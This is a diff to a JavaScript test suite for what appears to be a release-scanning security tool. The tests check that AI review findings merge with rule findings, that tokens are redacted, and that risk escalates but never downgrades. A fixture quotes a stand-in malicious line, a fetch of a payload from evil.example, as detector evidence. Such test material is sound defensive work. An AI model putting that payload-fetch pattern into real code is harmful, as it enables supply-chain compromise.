@@ -13,6 +13,7 @@ const {
   computeDiff,
   runDeterministicFindings,
   scoreRisk,
+  mergeAiFindings,
   resolveReleaseConsistency,
   persistResults,
   recordCompletion,
@@ -187,10 +188,6 @@ describe("runDeterministicFindings", () => {
     expect(out.releaseRuleFindings[0]).not.toHaveProperty("diffStatus");
     expect(out.releaseRuleFindings[0]).not.toHaveProperty("releaseDelta");
 
-    expect(out.findingAnnotations).toEqual([
-      { findingIndex: 0, diffStatus: "modified", releaseDelta: true },
-    ]);
-
     expect(adapter.summarizeDetails).toHaveBeenCalledWith(resolved.staged.details);
     expect(out.redactedDetails).toEqual({ stageId: "stage-1" });
   });
@@ -238,6 +235,135 @@ describe("scoreRisk", () => {
     expect(summary.contextRisk).toBe("medium");
     expect(summary.releaseFindingCount).toBe(1);
     expect(summary.contextFindingCount).toBe(1);
+  });
+});
+
+function makeCompleteAiReview(overrides = {}) {
+  return {
+    status: "complete",
+    risk: "critical",
+    releaseAssessment: "suspicious",
+    summary: "Staged payload downloader added.",
+    findings: [
+      {
+        severity: "critical",
+        file: "added.js",
+        evidence: "fetch('https://evil.example/payload')",
+        reason: "downloads and executes a staged payload",
+        recommendation: "block the release",
+      },
+    ],
+    requiresManualReview: true,
+    model: "test-model",
+    ...overrides,
+  };
+}
+
+describe("mergeAiFindings", () => {
+  test("projects a completed review's findings into annotated Finding records", () => {
+    const adapter = makeAdapter();
+    const diff = computeDiff(resolved);
+    const findings = runDeterministicFindings(adapter, resolved, diff);
+
+    const merged = mergeAiFindings(makeCompleteAiReview(), findings, diff, "javascript");
+
+    expect(merged.records).toEqual([
+      {
+        severity: "critical",
+        file: "added.js",
+        evidence: "fetch('https://evil.example/payload')",
+        reason: "downloads and executes a staged payload",
+      },
+    ]);
+    // added.js is new in this release, so the AI finding scopes to the release delta.
+    expect(merged.annotatedRecords[0]).toMatchObject({
+      file: "added.js",
+      diffStatus: "added",
+      releaseDelta: true,
+    });
+  });
+
+  test("redacts secret material quoted in AI evidence", () => {
+    const adapter = makeAdapter();
+    const diff = computeDiff(resolved);
+    const findings = runDeterministicFindings(adapter, resolved, diff);
+    const review = makeCompleteAiReview({
+      findings: [
+        {
+          severity: "high",
+          file: "index.js",
+          evidence: `hardcoded token ${NPM_TOKEN}`,
+          reason: "credential in source",
+          recommendation: "rotate the token",
+        },
+      ],
+    });
+
+    const merged = mergeAiFindings(review, findings, diff, "javascript");
+
+    expect(merged.records[0].evidence).toContain("[REDACTED_NPM_TOKEN]");
+    expect(merged.records[0].evidence).not.toContain(NPM_TOKEN);
+  });
+
+  test("contributes nothing when the review did not complete", () => {
+    const adapter = makeAdapter();
+    const diff = computeDiff(resolved);
+    const findings = runDeterministicFindings(adapter, resolved, diff);
+
+    for (const review of [
+      disabledAi,
+      makeCompleteAiReview({ status: "invalid" }),
+      makeCompleteAiReview({ releaseAssessment: "not_assessed" }),
+    ]) {
+      const merged = mergeAiFindings(review, findings, diff, "javascript");
+      expect(merged).toEqual({ records: [], annotatedRecords: [] });
+    }
+  });
+
+  test("AI findings escalate the risk breakdown but never downgrade deterministic findings", () => {
+    const adapter = makeAdapter();
+    const diff = computeDiff(resolved);
+    const findings = runDeterministicFindings(adapter, resolved, diff);
+
+    // Deterministic-only baseline: the rule finding grades high.
+    const deterministicOnly = scoreRisk(findings.annotatedFindings, disabledAi);
+    expect(deterministicOnly.artifactRisk).toBe("high");
+
+    // A low-severity AI finding must not lower any deterministic grade.
+    const lowReview = makeCompleteAiReview({
+      risk: "low",
+      releaseAssessment: "nothing_unusual",
+      requiresManualReview: false,
+      findings: [
+        {
+          severity: "low",
+          file: "added.js",
+          evidence: "console.log('new')",
+          reason: "routine logging",
+          recommendation: "none",
+        },
+      ],
+    });
+    const lowMerge = mergeAiFindings(lowReview, findings, diff, "javascript");
+    const withLowAi = scoreRisk(
+      [...findings.annotatedFindings, ...lowMerge.annotatedRecords],
+      lowReview,
+    );
+    expect(withLowAi.artifactRisk).toBe(deterministicOnly.artifactRisk);
+    expect(withLowAi.releaseRisk).toBe(deterministicOnly.releaseRisk);
+    expect(withLowAi.contextRisk).toBe(deterministicOnly.contextRisk);
+    // The AI finding is counted, in addition to the deterministic one.
+    expect(withLowAi.releaseFindingCount).toBe(deterministicOnly.releaseFindingCount + 1);
+
+    // A critical AI finding escalates.
+    const criticalReview = makeCompleteAiReview();
+    const criticalMerge = mergeAiFindings(criticalReview, findings, diff, "javascript");
+    const withCriticalAi = scoreRisk(
+      [...findings.annotatedFindings, ...criticalMerge.annotatedRecords],
+      criticalReview,
+    );
+    expect(withCriticalAi.artifactRisk).toBe("critical");
+    expect(withCriticalAi.releaseRisk).toBe("critical");
   });
 });
 
@@ -327,6 +453,39 @@ describe("persistResults", () => {
     // Release memory rides the result + persisted summary, advisory only.
     expect(result.releaseConsistency).toEqual(noneConsistency);
     expect(persistArg.summary.releaseConsistency).toEqual(noneConsistency);
+  });
+
+  test("persists AI finding records after the rule findings with combined annotations", async () => {
+    const adapter = makeAdapter();
+    const diff = computeDiff(resolved);
+    const findings = runDeterministicFindings(adapter, resolved, diff);
+    const aiReview = makeCompleteAiReview();
+    const mergedAiFindings = mergeAiFindings(aiReview, findings, diff, "javascript");
+    const riskSummary = scoreRisk(
+      [...findings.annotatedFindings, ...mergedAiFindings.annotatedRecords],
+      aiReview,
+    );
+
+    await persistResults({
+      db: {},
+      session: { userId: "user-1" },
+      adapter,
+      adapterInput: { stageId: "stage-1" },
+      identity: { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" },
+      resolved,
+      diff,
+      findings,
+      aiFindings: aiReview,
+      mergedAiFindings,
+      riskSummary,
+      releaseConsistency: noneConsistency,
+    });
+
+    const persistArg = dbMock.persistScan.mock.calls[0][1];
+    // Rule findings stay authoritative and unchanged; AI records ride separately.
+    expect(persistArg.findings).toEqual(findings.ruleFindings);
+    expect(persistArg.aiFindingRecords).toEqual(mergedAiFindings.records);
+    expect(persistArg.riskSummary.artifactRisk).toBe("critical");
   });
 
   test("propagates a non-persisted outcome from persistScan", async () => {
